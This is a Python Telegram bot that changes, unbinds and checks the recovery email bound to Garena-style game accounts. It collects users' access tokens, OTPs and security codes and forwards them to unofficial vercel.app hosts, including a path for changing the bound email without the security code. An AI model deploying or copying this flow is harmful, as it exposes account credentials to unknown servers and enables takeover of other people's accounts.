import os
import requests
import re
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Get bot token from environment variable
BOT_TOKEN = os.environ.get("BOT_TOKEN")

if not BOT_TOKEN:
    print("❌ BOT_TOKEN environment variable not set!")
    exit(1)

# Store user data
user_data = {}

def convert(seconds):
    try:
        s = int(seconds)
        d, h = divmod(s, 86400)
        h, m = divmod(h, 3600)
        m, s = divmod(m, 60)
        return f"{d}d {h}h {m}m {s}s"
    except:
        return "Unknown"

def is_success(response):
    try:
        if response.status_code != 200:
            return False
        data = response.json()
        return data.get("success", False)
    except:
        return False

def get_result(response):
    try:
        data = response.json()
        error = data.get("error")
        if error:
            if isinstance(error, dict):
                return error.get("error", str(error))
            return str(error)
        return data.get("message", "Success")
    except:
        return "Invalid response"

# API Functions
def api_check_bind(token):
    url = "https://bindinfocrownx612.vercel.app/check"
    try:
        r = requests.get(url, params={'access_token': token}, timeout=30)
        if is_success(r):
            data = r.json()
            info = data.get("data", {})
            result = f"""
📊 BIND INFORMATION
━━━━━━━━━━━━━━━━━━━━
▪️ Status: {info.get('status', 'N/A')}
▪️ Summary: {info.get('summary', 'N/A')}
▪️ Current Email: {info.get('current_email', 'N/A')}
▪️ Pending Email: {info.get('pending_email', 'N/A')}
▪️ Email to be: {info.get('email_to_be', 'N/A')}
▪️ Mobile: {info.get('mobile', 'N/A')}
▪️ Countdown: {info.get('countdown_human', 'N/A')}
━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: NINAD
📢 Channel: @clerkmm
"""
            return result
        return f"❌ Failed: {get_result(r)}\n\n👨‍💻 Developer: NINAD"
    except Exception as e:
        return f"❌ Error: {str(e)}"

def api_cancel_bind(token):
    url = "https://bindcnclcrownx34.vercel.app/cancelbind"
    try:
        r = requests.get(url, params={'access_token': token}, timeout=30)
        if is_success(r):
            return "✅ Bind request cancelled successfully!\n\n👨‍💻 Developer: NINAD\n📢 Channel: @clerkmm"
        return f"❌ Failed: {get_result(r)}\n\n👨‍💻 Developer: NINAD"
    except Exception as e:
        return f"❌ Error: {str(e)}"

def api_revoke_token(token):
    url = "https://crownxrevoker73.vercel.app/revoke"
    try:
        r = requests.get(url, params={'access_token': token}, timeout=30)
        if is_success(r):
            return "✅ Token revoked successfully!\n\n👨‍💻 Developer: NINAD\n📢 Channel: @clerkmm"
        return f"❌ Failed: {get_result(r)}\n\n👨‍💻 Developer: NINAD"
    except Exception as e:
        return f"❌ Error: {str(e)}"

def api_check_links(token):
    url = "https://100067.connect.garena.com/bind/app/platform/info/get"
    headers = {
        'User-Agent': 'GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)',
        'Connection': 'Keep-Alive'
    }
    try:
        r = requests.get(url, params={'access_token': token}, headers=headers, timeout=30)
        if r.status_code in [200, 201]:
            data = r.json()
            platforms = {3:"Facebook", 8:"Gmail", 10:"iCloud", 5:"VK", 11:"Twitter", 7:"Huawei"}
            bounded = data.get("bounded_accounts", [])
            
            result = "🔗 LINKED ACCOUNTS\n━━━━━━━━━━━━━━━━━━━━\n"
            found = False
            
            for acc in bounded:
                p = acc.get('platform')
                if p in platforms:
                    user_info = acc.get('user_info', {})
                    email = user_info.get('email', '')
                    name = user_info.get('nickname', '')
                    result += f"\n✅ {platforms[p]}"
                    if email:
                        result += f"\n   📧 Email: {email}"
                    if name:
                        result += f"\n   👤 Name: {name}"
                    result += "\n"
                    found = True
            
            if not found:
                result += "❌ No linked accounts found!\n"
            
            result += "\n━━━━━━━━━━━━━━━━━━━━\n👨‍💻 Developer: NINAD\n📢 Channel: @clerkmm"
            return result
        return f"❌ Failed to fetch links!\n\n👨‍💻 Developer: NINAD"
    except Exception as e:
        return f"❌ Error: {str(e)}"

def api_bind_new_email(token, email):
    url = "https://bindcnclcrownx34.vercel.app/bind"
    try:
        r = requests.get(url, params={'access_token': token, 'email': email}, timeout=30)
        if is_success(r):
            return f"✅ OTP sent to {email}\n\nPlease send the OTP code:"
        return f"❌ Failed: {get_result(r)}"
    except Exception as e:
        return f"❌ Error: {str(e)}"

def api_confirm_bind(token, email, otp, security_code):
    url = "https://bindcnclcrownx34.vercel.app/confirmbind"
    try:
        r = requests.get(url, params={'access_token': token, 'email': email, 'otp': otp, 'security_code': security_code}, timeout=30)
        if is_success(r):
            return f"✅ Email {email} bound successfully!\n\n👨‍💻 Developer: NINAD\n📢 Channel: @clerkmm"
        return f"❌ Failed: {get_result(r)}\n\n👨‍💻 Developer: NINAD"
    except Exception as e:
        return f"❌ Error: {str(e)}"

def bind_change_with_security(token, email, security_code):
    url = "https://chngemailcode48.vercel.app/send_otp"
    try:
        r = requests.get(url, params={'access_token': token, 'email': email}, timeout=30)
        if not is_success(r):
            return f"❌ Failed to send OTP: {get_result(r)}"
        return f"✅ OTP sent to {email}\n\nPlease send the OTP code:"
    except Exception as e:
        return f"❌ Error: {str(e)}"

def bind_change_verify_otp(token, email, otp):
    url = "https://chngemailcode48.vercel.app/verify_otp"
    try:
        r = requests.get(url, params={'access_token': token, 'email': email, 'otp': otp}, timeout=30)
        if is_success(r):
            data = r.json()
            verifier_token = data.get("verifier_token") or data.get("data", {}).get("verifier_token")
            return f"✅ OTP Verified!\n\nPlease send your Security Code:", verifier_token
        return f"❌ Invalid OTP: {get_result(r)}", None
    except Exception as e:
        return f"❌ Error: {str(e)}", None

def bind_change_verify_security(token, email, security_code, verifier_token):
    url_i = "https://chngemailcode48.vercel.app/verify_identity"
    try:
        r = requests.get(url_i, params={'access_token': token, 'code': security_code}, timeout=30)
        if is_success(r):
            data = r.json()
            identity_token = data.get("identity_token") or data.get("data", {}).get("identity_token")
            
            url_c = "https://chngemailcode48.vercel.app/create_rebind"
            r_c = requests.get(url_c, params={'access_token': token, 'email': email, 'identity_token': identity_token, 'verifier_token': verifier_token}, timeout=30)
            
            if is_success(r_c):
                return f"✅ Successfully Changed Email To: {email}!\n\n👨‍💻 Developer: NINAD\n📢 Channel: @clerkmm"
            return f"❌ Failed to change email: {get_result(r_c)}"
        return f"❌ Invalid Security Code: {get_result(r)}"
    except Exception as e:
        return f"❌ Error: {str(e)}"

def bind_change_forgot_security(token, current_email, new_email):
    url1 = "https://chngeforgotcrownx72.vercel.app/otp"
    try:
        r1 = requests.get(url1, params={'access_token': token, 'current_email': current_email}, timeout=30)
        if not is_success(r1):
            return f"❌ Failed to send OTP to current email: {get_result(r1)}", None
        return f"✅ OTP sent to current email: {current_email}\n\nPlease send the OTP code:", "waiting_otp"
    except Exception as e:
        return f"❌ Error: {str(e)}", None

def bind_change_verify_current_otp(token, current_email, otp):
    url2 = "https://chngeforgotcrownx72.vercel.app/verify"
    try:
        r2 = requests.get(url2, params={'access_token': token, 'current_email': current_email, 'otp': otp}, timeout=30)
        if is_success(r2):
            data = r2.json()
            identity_token = data.get("identity_token") or data.get("data", {}).get("identity_token")
            return f"✅ Current Email Verified!\n\nNow send your new email address:", identity_token
        return f"❌ Invalid OTP: {get_result(r2)}", None
    except Exception as e:
        return f"❌ Error: {str(e)}", None

def bind_change_send_new_otp(token, new_email, identity_token):
    url3 = "https://chngeforgotcrownx72.vercel.app/newotp"
    try:
        r3 = requests.get(url3, params={'access_token': token, 'new_email': new_email}, timeout=30)
        if is_success(r3):
            return f"✅ OTP sent to new email: {new_email}\n\nPlease send the OTP code:", identity_token
        return f"❌ Failed to send OTP to new email: {get_result(r3)}", None
    except Exception as e:
        return f"❌ Error: {str(e)}", None

def bind_change_verify_new_otp(token, new_email, otp, identity_token):
    url4 = "https://chngeforgotcrownx72.vercel.app/newverify"
    try:
        r4 = requests.get(url4, params={'access_token': token, 'new_email': new_email, 'otp': otp}, timeout=30)
        if is_success(r4):
            data = r4.json()
            verifier_token = data.get("verifier_token") or data.get("data", {}).get("verifier_token")
            
            url5 = "https://chngeforgotcrownx72.vercel.app/change"
            r5 = requests.get(url5, params={'access_token': token, 'new_email': new_email, 'identity_token': identity_token, 'verifier_token': verifier_token}, timeout=30)
            
            if is_success(r5):
                return f"✅ Successfully Changed Email To: {new_email} (Forgot Security Code)!\n\n👨‍💻 Developer: NINAD\n📢 Channel: @clerkmm"
            return f"❌ Failed to change email: {get_result(r5)}"
        return f"❌ Invalid OTP: {get_result(r4)}"
    except Exception as e:
        return f"❌ Error: {str(e)}"

def unbind_with_security(token, security_code):
    url = "https://crownxnewkey10010.vercel.app/securityunbind"
    try:
        r = requests.get(url, params={'access_token': token, 'security_code': security_code}, timeout=30)
        if is_success(r):
            return "✅ Unbind Request Created Successfully! 15 Days Timer Started.\n\n👨‍💻 Developer: NINAD\n📢 Channel: @clerkmm"
        return f"❌ Failed: {get_result(r)}\n\n👨‍💻 Developer: NINAD"
    except Exception as e:
        return f"❌ Error: {str(e)}"

def unbind_forgot_security(token, current_email):
    url1 = "https://chngeforgotcrownx72.vercel.app/otp"
    try:
        r1 = requests.get(url1, params={'access_token': token, 'current_email': current_email}, timeout=30)
        if not is_success(r1):
            return f"❌ Failed to send OTP: {get_result(r1)}", None
        return f"✅ OTP sent to: {current_email}\n\nPlease send the OTP code:", "waiting_otp"
    except Exception as e:
        return f"❌ Error: {str(e)}", None

def unbind_verify_otp(token, current_email, otp):
    url2 = "https://chngeforgotcrownx72.vercel.app/verify"
    try:
        r2 = requests.get(url2, params={'access_token': token, 'current_email': current_email, 'otp': otp}, timeout=30)
        if is_success(r2):
            data = r2.json()
            identity_token = data.get("identity_token") or data.get("data", {}).get("identity_token")
            
            url3 = "https://crownxforgotremove23.vercel.app/forgotunbind"
            r3 = requests.get(url3, params={'access_token': token, 'identity_token': identity_token}, timeout=30)
            
            if is_success(r3):
                return "✅ Unbind Request Created Successfully! 15 Days Timer Started.\n\n👨‍💻 Developer: NINAD\n📢 Channel: @clerkmm"
            return f"❌ Failed to unbind: {get_result(r3)}"
        return f"❌ Invalid OTP: {get_result(r2)}"
    except Exception as e:
        return f"❌ Error: {str(e)}"

# Telegram Bot Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [KeyboardButton("🔄 BIND CHANGE")],
        [KeyboardButton("📧 UNBIND EMAIL")],
        [KeyboardButton("ℹ️ CHECK BIND INFO")],
        [KeyboardButton("❌ CANCEL MAIL BIND")],
        [KeyboardButton("➕ BIND NEW EMAIL")],
        [KeyboardButton("🔗 CHECK LINKS")],
        [KeyboardButton("🔑 REVOKE TOKEN")],
        [KeyboardButton("❌ EXIT")]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    welcome_text = """
🤖 BIND MAIL BOT
━━━━━━━━━━━━━━━━━━━━

👨‍💻 DEVELOPER: NINAD
📢 CHANNEL: @clerkmm
✅ STATUS: STABLE & ACTIVE

━━━━━━━━━━━━━━━━━━━━

Welcome! Use the buttons below.
"""
    await update.message.reply_text(welcome_text, reply_markup=reply_markup)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    
    # Main menu buttons
    if text == "🔄 BIND CHANGE":
        keyboard = [
            [KeyboardButton("✅ WITH SECURITY CODE")],
            [KeyboardButton("❌ FORGOT SECURITY CODE")],
            [KeyboardButton("🔙 BACK TO MENU")]
        ]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text("🔄 BIND CHANGE\n━━━━━━━━━━━━━━━━━━━━\n\nChoose option:", reply_markup=reply_markup)
        return
        
    elif text == "✅ WITH SECURITY CODE":
        context.user_data['bind_mode'] = 'with_security'
        await update.message.reply_text("📝 Please send your Access Token:")
        return
        
    elif text == "❌ FORGOT SECURITY CODE":
        context.user_data['bind_mode'] = 'forgot_security'
        await update.message.reply_text("📝 Please send your Access Token:")
        return
        
    elif text == "📧 UNBIND EMAIL":
        keyboard = [
            [KeyboardButton("✅ WITH SECURITY CODE")],
            [KeyboardButton("❌ FORGOT SECURITY CODE")],
            [KeyboardButton("🔙 BACK TO MENU")]
        ]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text("📧 UNBIND EMAIL\n━━━━━━━━━━━━━━━━━━━━\n\nChoose option:", reply_markup=reply_markup)
        return
        
    elif text == "🔙 BACK TO MENU":
        keyboard = [
            [KeyboardButton("🔄 BIND CHANGE")],
            [KeyboardButton("📧 UNBIND EMAIL")],
            [KeyboardButton("ℹ️ CHECK BIND INFO")],
            [KeyboardButton("❌ CANCEL MAIL BIND")],
            [KeyboardButton("➕ BIND NEW EMAIL")],
            [KeyboardButton("🔗 CHECK LINKS")],
            [KeyboardButton("🔑 REVOKE TOKEN")],
            [KeyboardButton("❌ EXIT")]
        ]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text("🔙 Main Menu:", reply_markup=reply_markup)
        return
        
    elif text == "ℹ️ CHECK BIND INFO":
        context.user_data['action'] = 'check_bind'
        await update.message.reply_text("📝 Please send your Access Token:")
        return
        
    elif text == "❌ CANCEL MAIL BIND":
        context.user_data['action'] = 'cancel_bind'
        await update.message.reply_text("📝 Please send your Access Token:")
        return
        
    elif text == "➕ BIND NEW EMAIL":
        context.user_data['action'] = 'bind_new'
        await update.message.reply_text("📝 Please send your Access Token:")
        return
        
    elif text == "🔗 CHECK LINKS":
        context.user_data['action'] = 'check_links'
        await update.message.reply_text("📝 Please send your Access Token:")
        return
        
    elif text == "🔑 REVOKE TOKEN":
        context.user_data['action'] = 'revoke_token'
        await update.message.reply_text("📝 Please send your Access Token:")
        return
        
    elif text == "❌ EXIT":
        keyboard = [
            [KeyboardButton("🔄 BIND CHANGE")],
            [KeyboardButton("📧 UNBIND EMAIL")],
            [KeyboardButton("ℹ️ CHECK BIND INFO")],
            [KeyboardButton("❌ CANCEL MAIL BIND")],
            [KeyboardButton("➕ BIND NEW EMAIL")],
            [KeyboardButton("🔗 CHECK LINKS")],
            [KeyboardButton("🔑 REVOKE TOKEN")],
            [KeyboardButton("❌ EXIT")]
        ]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text("👋 Type /start to restart", reply_markup=reply_markup)
        return
    
    # Process BIND CHANGE with security code flow
    if 'bind_mode' in context.user_data:
        mode = context.user_data['bind_mode']
        
        if mode == 'with_security':
            if 'step' not in context.user_data:
                context.user_data['step'] = 'token'
                context.user_data['token'] = text
                context.user_data['step'] = 'email'
                await update.message.reply_text("📧 Please send the NEW email address:")
                return
                
            elif context.user_data['step'] == 'email':
                context.user_data['email'] = text
                result = bind_change_with_security(context.user_data['token'], context.user_data['email'], None)
                context.user_data['step'] = 'otp'
                await update.message.reply_text(result)
                return
                
            elif context.user_data['step'] == 'otp':
                result, verifier = bind_change_verify_otp(context.user_data['token'], context.user_data['email'], text)
                if verifier:
                    context.user_data['verifier'] = verifier
                    context.user_data['step'] = 'security'
                    await update.message.reply_text(result)
                else:
                    await update.message.reply_text(result)
                    context.user_data.pop('bind_mode')
                    context.user_data.pop('step')
                return
                
            elif context.user_data['step'] == 'security':
                result = bind_change_verify_security(context.user_data['token'], context.user_data['email'], text, context.user_data['verifier'])
                await update.message.reply_text(result)
                context.user_data.pop('bind_mode')
                context.user_data.pop('step')
                return
        
        elif mode == 'forgot_security':
            if 'step' not in context.user_data:
                context.user_data['step'] = 'token'
                context.user_data['token'] = text
                context.user_data['step'] = 'current_email'
                await update.message.reply_text("📧 Please send the CURRENT email address:")
                return
                
            elif context.user_data['step'] == 'current_email':
                context.user_data['current_email'] = text
                context.user_data['step'] = 'new_email'
                await update.message.reply_text("📧 Please send the NEW email address:")
                return
                
            elif context.user_data['step'] == 'new_email':
                context.user_data['new_email'] = text
                result, _ = bind_change_forgot_security(context.user_data['token'], context.user_data['current_email'], context.user_data['new_email'])
                context.user_data['step'] = 'current_otp'
                await update.message.reply_text(result)
                return
                
            elif context.user_data['step'] == 'current_otp':
                result, identity = bind_change_verify_current_otp(context.user_data['token'], context.user_data['current_email'], text)
                if identity:
                    context.user_data['identity'] = identity
                    context.user_data['step'] = 'waiting_new_email'
                    await update.message.reply_text(result)
                else:
                    await update.message.reply_text(result)
                    context.user_data.pop('bind_mode')
                    context.user_data.pop('step')
                return
                
            elif context.user_data['step'] == 'waiting_new_email':
                context.user_data['new_email'] = text
                result, identity = bind_change_send_new_otp(context.user_data['token'], context.user_data['new_email'], context.user_data['identity'])
                context.user_data['step'] = 'new_otp'
                await update.message.reply_text(result)
                return
                
            elif context.user_data['step'] == 'new_otp':
                result = bind_change_verify_new_otp(context.user_data['token'], context.user_data['new_email'], text, context.user_data['identity'])
                await update.message.reply_text(result)
                context.user_data.pop('bind_mode')
                context.user_data.pop('step')
                return
    
    # Process UNBIND EMAIL flow
    if 'unbind_mode' in context.user_data:
        mode = context.user_data['unbind_mode']
        
        if mode == 'with_security':
            if 'step' not in context.user_data:
                context.user_data['step'] = 'token'
                context.user_data['token'] = text
                context.user_data['step'] = 'security'
                await update.message.reply_text("🔑 Please send your Security Code:")
                return
                
            elif context.user_data['step'] == 'security':
                result = unbind_with_security(context.user_data['token'], text)
                await update.message.reply_text(result)
                context.user_data.pop('unbind_mode')
                context.user_data.pop('step')
                return
        
        elif mode == 'forgot_security':
            if 'step' not in context.user_data:
                context.user_data['step'] = 'token'
                context.user_data['token'] = text
                context.user_data['step'] = 'email'
                await update.message.reply_text("📧 Please send your CURRENT email address:")
                return
                
            elif context.user_data['step'] == 'email':
                context.user_data['email'] = text
                result, _ = unbind_forgot_security(context.user_data['token'], context.user_data['email'])
                context.user_data['step'] = 'otp'
                await update.message.reply_text(result)
                return
                
            elif context.user_data['step'] == 'otp':
                result = unbind_verify_otp(context.user_data['token'], context.user_data['email'], text)
                await update.message.reply_text(result)
                context.user_data.pop('unbind_mode')
                context.user_data.pop('step')
                return
    
    # Process UNBIND EMAIL selection
    if text == "✅ WITH SECURITY CODE" and context.user_data.get('awaiting_unbind'):
        context.user_data['unbind_mode'] = 'with_security'
        context.user_data['step'] = 'token'
        await update.message.reply_text("📝 Please send your Access Token:")
        return
        
    elif text == "❌ FORGOT SECURITY CODE" and context.user_data.get('awaiting_unbind'):
        context.user_data['unbind_mode'] = 'forgot_security'
        context.user_data['step'] = 'token'
        await update.message.reply_text("📝 Please send your Access Token:")
        return
    
    # Handle UNBIND EMAIL menu
    if text == "📧 UNBIND EMAIL":
        context.user_data['awaiting_unbind'] = True
        return
    
    # Regular actions
    action = context.user_data.get('action')
    
    if action == 'check_bind':
        result = api_check_bind(text)
        await update.message.reply_text(result)
        context.user_data['action'] = None
        
    elif action == 'cancel_bind':
        result = api_cancel_bind(text)
        await update.message.reply_text(result)
        context.user_data['action'] = None
        
    elif action == 'check_links':
        result = api_check_links(text)
        await update.message.reply_text(result)
        context.user_data['action'] = None
        
    elif action == 'revoke_token':
        result = api_revoke_token(text)
        await update.message.reply_text(result)
        context.user_data['action'] = None
        
    elif action == 'bind_new':
        context.user_data['bind_token'] = text
        context.user_data['action'] = 'bind_new_email'
        await update.message.reply_text("📧 Please send the new email address:")
        
    elif action == 'bind_new_email':
        result = api_bind_new_email(context.user_data['bind_token'], text)
        context.user_data['bind_email'] = text
        context.user_data['action'] = 'bind_new_otp'
        await update.message.reply_text(result)
        
    elif action == 'bind_new_otp':
        context.user_data['bind_otp'] = text
        context.user_data['action'] = 'bind_new_security'
        await update.message.reply_text("🔑 Please send your Security Code:")
        
    elif action == 'bind_new_security':
        result = api_confirm_bind(context.user_data['bind_token'], context.user_data['bind_email'], context.user_data['bind_otp'], text)
        await update.message.reply_text(result)
        context.user_data['action'] = None

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
🤖 BIND MAIL BOT HELP
━━━━━━━━━━━━━━━━━━━━

Commands:
/start - Start the bot
/help - Show this help

Features:
✅ Bind Change - With/Without Security Code
✅ Unbind Email - With/Without Security Code  
✅ Check Bind Info - View current binding
✅ Cancel Mail Bind - Cancel pending bind
✅ Bind New Email - Add new email
✅ Check Links - View linked platforms
✅ Revoke Token - Revoke access token

━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: NINAD
📢 Channel: @clerkmm
"""
    await update.message.reply_text(help_text)

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🤖 Bot is running...")
    print("👨‍💻 Developer: NINAD")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)

if __name__ == "__main__":
    main()